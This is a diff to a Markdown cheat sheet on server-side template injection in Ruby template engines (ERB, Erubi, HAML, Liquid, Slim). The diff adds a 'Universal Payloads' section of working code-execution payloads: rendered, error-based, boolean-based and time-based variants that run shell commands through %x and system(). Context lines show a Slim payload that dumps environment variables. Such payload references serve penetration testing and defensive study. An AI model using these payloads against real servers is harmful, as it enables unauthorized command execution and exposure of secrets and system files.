@@ -2,30 +2,41 @@
 
 > Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.
 
-
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
+- [Universal Payloads](#universal-payloads)
 - [Ruby](#ruby)
     - [Ruby - Basic injections](#ruby---basic-injections)
     - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
     - [Ruby - List files and directories](#ruby---list-files-and-directories)
-    - [Ruby - Remote Command execution](#ruby---remote-Command-execution)
+    - [Ruby - Remote Command execution](#ruby---remote-command-execution)
 - [References](#references)
-
 
 ## Templating Libraries
 
 | Template Name | Payload Format |
-| ------------ | --------- |
-| Erb      | `<%= %>`   |
-| Erubi    | `<%= %>`   |
-| Erubis   | `<%= %>`   |
-| HAML     | `#{ }`     |
-| Liquid   | `{{ }}`    |
-| Mustache | `{{ }}`    |
-| Slim     | `#{ }`     |
+|---------------|----------------|
+| Erb           | `<%= %>`       |
+| Erubi         | `<%= %>`       |
+| Erubis        | `<%= %>`       |
+| HAML          | `#{ }`         |
+| Liquid        | `{{ }}`        |
+| Mustache      | `{{ }}`        |
+| Slim          | `#{ }`         |
 
+## Universal Payloads
+
+Generic code injection payloads work for many Ruby-based template engines, such as Erb, Erubi, Erubis, HAML and Slim.
+
+To use these payloads, wrap them in the appropriate tag.
+
+```ruby
+%x('id') # Rendered RCE
+File.read("Y:/A:/"+%x('id')) # Error-Based RCE
+1/(system("id")&&1||0) # Boolean-Based RCE
+system("id && sleep 5") # Time-Based RCE
+```
 
 ## Ruby
 
@@ -74,7 +85,7 @@ Execute code using SSTI for **Slim** engine.
 #{ %x|env| }
 ```
 
-
 ## References
 
-* [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
+- [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
